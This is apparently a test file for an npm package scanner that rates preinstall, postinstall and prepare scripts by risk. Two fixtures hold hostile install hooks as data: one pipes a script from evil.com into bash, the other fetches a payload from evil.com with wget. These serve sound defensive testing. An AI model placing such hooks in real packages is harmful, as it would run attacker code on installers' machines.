import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { promises as fs } from 'node:fs';
import { join } from 'node:path';
import os from 'node:os';
import { scanHooks } from '../../dist/scanners/hooks.js';

describe('Hooks Scanner', () => {
  let tmpDir;

  before(async () => {
    tmpDir = await fs.mkdtemp(join(os.tmpdir(), 'npx-ray-hooks-'));
  });

  after(async () => {
    await fs.rm(tmpDir, { recursive: true, force: true });
  });

  it('should return no findings for package.json with no scripts', async () => {
    const dir = join(tmpDir, 'no-scripts');
    await fs.mkdir(dir, { recursive: true });
    await fs.writeFile(join(dir, 'package.json'), JSON.stringify({
      name: 'safe-package',
      version: '1.0.0',
    }));

    const result = await scanHooks(dir);

    assert.equal(result.name, 'hooks');
    assert.equal(result.passed, true);
    assert.equal(result.findings.length, 0);
    assert.ok(result.summary.includes('No scripts defined'));
  });

  it('should flag postinstall with node command as warning', async () => {
    const dir = join(tmpDir, 'postinstall-node');
    await fs.mkdir(dir, { recursive: true });
    await fs.writeFile(join(dir, 'package.json'), JSON.stringify({
      name: 'setup-package',
      version: '1.0.0',
      scripts: {
        postinstall: 'node setup.js',
      },
    }));

    const result = await scanHooks(dir);

    assert.equal(result.passed, false);
    const postinstallFindings = result.findings.filter(f =>
      f.message.includes('postinstall')
    );
    assert.ok(postinstallFindings.length > 0, 'Should flag postinstall');
    assert.equal(postinstallFindings[0].severity, 'warning');
  });

  it('should flag postinstall with curl|bash as critical', async () => {
    const dir = join(tmpDir, 'postinstall-curl');
    await fs.mkdir(dir, { recursive: true });
    await fs.writeFile(join(dir, 'package.json'), JSON.stringify({
      name: 'evil-package',
      version: '1.0.0',
      scripts: {
        postinstall: 'curl http://evil.com/install.sh | bash',
      },
    }));

    const result = await scanHooks(dir);

    assert.equal(result.passed, false);
    const criticalFindings = result.findings.filter(f =>
      f.severity === 'critical'
    );
    assert.ok(criticalFindings.length > 0, 'Should flag curl|bash as critical');
    assert.ok(criticalFindings[0].message.includes('shell commands'));
  });

  it('should flag prepare script as info only', async () => {
    const dir = join(tmpDir, 'prepare-only');
    await fs.mkdir(dir, { recursive: true });
    await fs.writeFile(join(dir, 'package.json'), JSON.stringify({
      name: 'build-package',
      version: '1.0.0',
      scripts: {
        prepare: 'npm run build',
      },
    }));

    const result = await scanHooks(dir);

    // prepare is info-only, so the scanner should pass
    assert.equal(result.passed, true);
    const prepareFindings = result.findings.filter(f =>
      f.message.includes('prepare')
    );
    assert.ok(prepareFindings.length > 0, 'Should note prepare script');
    assert.equal(prepareFindings[0].severity, 'info');
  });

  it('should not flag non-lifecycle scripts like test/build/start', async () => {
    const dir = join(tmpDir, 'normal-scripts');
    await fs.mkdir(dir, { recursive: true });
    await fs.writeFile(join(dir, 'package.json'), JSON.stringify({
      name: 'normal-package',
      version: '1.0.0',
      scripts: {
        test: 'jest',
        build: 'tsc',
        start: 'node index.js',
        lint: 'eslint .',
      },
    }));

    const result = await scanHooks(dir);

    assert.equal(result.passed, true);
    assert.equal(result.findings.length, 0);
  });

  it('should flag preinstall as warning', async () => {
    const dir = join(tmpDir, 'preinstall');
    await fs.mkdir(dir, { recursive: true });
    await fs.writeFile(join(dir, 'package.json'), JSON.stringify({
      name: 'pre-package',
      version: '1.0.0',
      scripts: {
        preinstall: 'node check-requirements.js',
      },
    }));

    const result = await scanHooks(dir);

    assert.equal(result.passed, false);
    const preFindings = result.findings.filter(f =>
      f.message.includes('preinstall')
    );
    assert.ok(preFindings.length > 0, 'Should flag preinstall');
    assert.equal(preFindings[0].severity, 'warning');
  });

  it('should handle missing package.json gracefully', async () => {
    const dir = join(tmpDir, 'no-pkg-json');
    await fs.mkdir(dir, { recursive: true });

    const result = await scanHooks(dir);

    assert.equal(result.passed, true);
    assert.equal(result.findings.length, 0);
    assert.ok(result.summary.includes('No package.json'));
  });

  it('should flag multiple dangerous hooks', async () => {
    const dir = join(tmpDir, 'multi-hooks');
    await fs.mkdir(dir, { recursive: true });
    await fs.writeFile(join(dir, 'package.json'), JSON.stringify({
      name: 'multi-hook-package',
      version: '1.0.0',
      scripts: {
        preinstall: 'node pre.js',
        postinstall: 'wget http://evil.com/payload',
        preuninstall: 'node cleanup.js',
      },
    }));

    const result = await scanHooks(dir);

    assert.equal(result.passed, false);
    // postinstall with wget should be critical, others warning
    const criticals = result.findings.filter(f => f.severity === 'critical');
    const warnings = result.findings.filter(f => f.severity === 'warning');
    assert.ok(criticals.length >= 1, 'Should have at least 1 critical (wget)');
    assert.ok(warnings.length >= 2, 'Should have at least 2 warnings');
  });
});
